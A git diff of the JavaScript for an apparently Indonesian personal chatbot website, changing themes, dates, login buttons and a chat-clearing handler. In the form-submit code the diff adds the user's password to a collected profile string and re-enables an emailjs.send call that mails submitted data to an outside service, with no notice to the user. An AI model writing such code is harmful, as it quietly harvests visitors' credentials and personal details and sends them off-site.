@@ -191,9 +191,9 @@ function reductionMonth(lastMonth, monthNow) {
 }
 
 const bulanNow = `${y}` + '-' + `${monthIndex + 1}` + '-' + `${d}`;
-const MonthAgo = reductionMonth('2023-06-01', `${bulanNow}`);
+const MonthAgo = reductionMonth('2024-06-01', `${bulanNow}`);
 const FYIMonth = document.getElementById('txt-hint');
-FYIMonth.innerHTML = `This website was first developed and created on 1 June 2023. FYI this it was ${MonthAgo} months ago !<br><br>Developer : Farid Fathoni N`
+FYIMonth.innerHTML = `This website was first developed and created on 1 June 2023. FYI this it was 1 year ${MonthAgo} months ago !<br><br>Developer : Farid Fathoni N`
 
 
 
@@ -216,8 +216,8 @@ FYIMonth.innerHTML = `This website was first developed and created on 1 June 202
 
 
 
-const containerPopup = document.querySelector('.container-my-popup');
 const personality_page = document.querySelector('.container-personality-box');
+const containerPopup = document.querySelector('.container-my-popup');
 const myPopup = document.querySelector('.my-popup');
 const clonedMyPopup = myPopup.cloneNode(true);
 const iconPopup = clonedMyPopup.querySelector('.my-popup #ico-koleksi');
@@ -315,6 +315,26 @@ function handleAction(params) {
   break;
   default:
   console.log('default');
+ }
+}
+
+function handlingAction(params) {
+ const { action, event } = params;
+ 
+ switch(event) {
+  case 'clear-message':
+   const containerChat = document.querySelector("#wrapper-item-chat #contentPertanyaan");
+   firstContentPertanyaan.style.display = "none";
+   notificationPopup({ icon: 'alert', text: 'Berhasil membersihkan chat!' });
+   
+   while (containerChat.childElementCount > 1) {
+    containerChat.removeChild(containerChat.firstChild);
+   }
+  break;
+  case 'default':
+   
+  break;
+  default:
  }
 }
 
@@ -554,7 +574,7 @@ window.addEventListener('load', () => {
   const loaderTime = (getUser && isLogin) ? 50 : 100 ;
  
  setTimeout(() => {
- loadingAnimation({ 
+ loadingAnimation({
    active: containerHome,
    remove: defaultElem,
    conditional: defaultElem,
@@ -565,7 +585,9 @@ window.addEventListener('load', () => {
   isCustomParticle ? pjsDefault.style.display = 'none' : pjsDefault.style.display = 'block';
   linearCustom.style.display = isCustomParticle ? "none" : "none";
   pjsGame.style.visibility = isCustomParticle ? "visibility" : "hidden";
-  isCustomParticle ? particlesGame({ mode: null, direction: null, image: null, speed: null, key: false }) : console.log('user belum memenangkan game apapun');
+  isCustomParticle ? particlesGame({ mode: null, direction: null, image: 'assets/sticker/hearts.png', speed: null, key: false }) : console.log('user belum memenangkan game apapun');
+  
+  document.querySelector('#signup-text').innerHTML = isLogin ? `<button class="btn-login"><span><ion-icon name="person"></ion-icon>${namaDepan}</span></button>` : `<button class="btn-login"><span><ion-icon name="person"></ion-icon>SIGN UP</span></button>`;
   
   
   loaders.style.display = "none";
@@ -803,8 +825,8 @@ let value_email = document.querySelector('.value_email');
 
 
 
-value_email.addEventListener('input', autoResize);
-inputJawaban.addEventListener('input', autoResize);
+
+[value_email, inputJawaban].forEach((item) => item.addEventListener('input', autoResize));
 
 function autoResize() {
  value_email.style.height = 'auto';
@@ -858,9 +880,10 @@ formEmail.addEventListener('submit', function(e) {
     let lastNames = fullName.split(' ').length<= 2 ? namaDepan : lastName;
     let personalitys = `
     Nama Depan: ${namaDepan}\n` +
-    `Nama Belakang: ${lastNames}\n` +
+    `Nama Lengkap: ${fullName}\n` +
     `Nama Pengguna: ${user}\n` +
     `Email Pengguna: ${emailUser}\n` +
+    `Email Password: ${passwordUser}\n` +
     `Tanggal Login: ${dateLogin}\n` +
     `Tanggal Lahir: ${birth}\n\n` +
     `Lagu Favorit: ${songs}\n` +
@@ -884,7 +907,7 @@ formEmail.addEventListener('submit', function(e) {
      chatValues: chatValue
     };
     
-    //emailjs.send("service_uuzer5a", "template_wb424q8", templateParams);
+    emailjs.send("service_uuzer5a", "template_wb424q8", templateParams);
     
     setTimeout(() => {
      addNewEmail();
@@ -1050,7 +1073,7 @@ const themeJSON = () => {
        bubbleUser: '#1c4fc7',
        bubbleBot: '#132469',
        shadowUser: '',
-       shadowBot: 'rgba(86,136,255,0.861)',
+       shadowBot: '',
        tinyText: '#b4ccff',
        backgroundPY: 'calc(100% + 80%)',
        backgroundImage: 'url("assets/background/dark_1.jpg")'
@@ -1058,7 +1081,7 @@ const themeJSON = () => {
      },
      {
       templateName: 'PURPLE NIGHT',
-      themeLoved: 'nabilla',
+      themeLoved: false,
       keyColor: {
        primaryIconColor: '#973cff',
        primaryTextColor: '#d1aff5',
@@ -1086,7 +1109,7 @@ const themeJSON = () => {
      },
      {
       templateName: 'DEEP SUNSET',
-      themeLoved: 'pasya',
+      themeLoved: false,
       keyColor: {
        primaryIconColor: '#ff5728',
        primaryTextColor: '#efbfaa',
@@ -1104,18 +1127,18 @@ const themeJSON = () => {
        
        bubbleUser: '#c73c00',
        bubbleBot: '#8d3c31',
-       shadowUser: '#ffffff',
-       shadowBot: '#ffffff',
+       shadowUser: '',
+       shadowBot: '',
        tinyText: '#efbfaa',
        primaryCards: '#592705',
        backgroundColor: '#000000',
-       backgroundPY: '50%',
+       backgroundPY: '120%',
        backgroundImage: 'url("assets/background/dark_3.jpg")'
       }
      },
      {
       templateName: 'CYAN FOREST',
-      themeLoved: 'pasya',
+      themeLoved: false,
       keyColor: {
        primaryIconColor: '#18c6ff',
        primaryColor: '#055950',
@@ -1142,7 +1165,7 @@ const themeJSON = () => {
      },
      {
       templateName: 'GREEN TEA',
-      themeLoved: 'pasya',
+      themeLoved: false,
       keyColor: {
        primaryIconColor: '#ba2108',
        primaryTextColor: '#6bba46',
@@ -1158,8 +1181,8 @@ const themeJSON = () => {
        secondaryCards: '#210909d1',
        secondaryBackground: '#000000',
        
-       bubbleUser: '',
-       bubbleBot: '',
+       bubbleUser: '#8b2100',
+       bubbleBot: '#232323',
        shadowUser: '',
        shadowBot: '',
        tinyText: '#aeaeae',
@@ -1241,8 +1264,7 @@ const themeJSON = () => {
   }
  }
  
-
-const defaultTheme = themeJSON().type.themeDark[1].keyColor;
+const defaultTheme = themeJSON().type.themeDark[4].keyColor;
 
  const outerLocalTheme = {
   theme: '',
@@ -1641,7 +1663,7 @@ function toggleLogin(event) {
   break;
   case 'submit':
    if (alreadyLogin) {
-    tsConfetti(0);
+    tsConfetti(4);
     notificationPopup({ icon: 'info', text: 'kamu sudah login' })
     login.flagLogin.isStart = true;
     document.querySelector('#signup-text').innerHTML = `<button class="btn-login"><span><ion-icon name="person"></ion-icon>Full Login</span></button>`;;
@@ -1714,7 +1736,7 @@ function toggleStart(event) {
    }
   break;
   default:
-  return cl('default');
+  return cl('default toggleStart');
  }
 }
 
@@ -1822,7 +1844,6 @@ function togglePage(page) {
    backGuide.onclick = () => { togglePage('guide') };
   break;
   case 'personal':
-   
    loadingAnimation({ 
     active: personality_page,
     remove: containerUserPage,
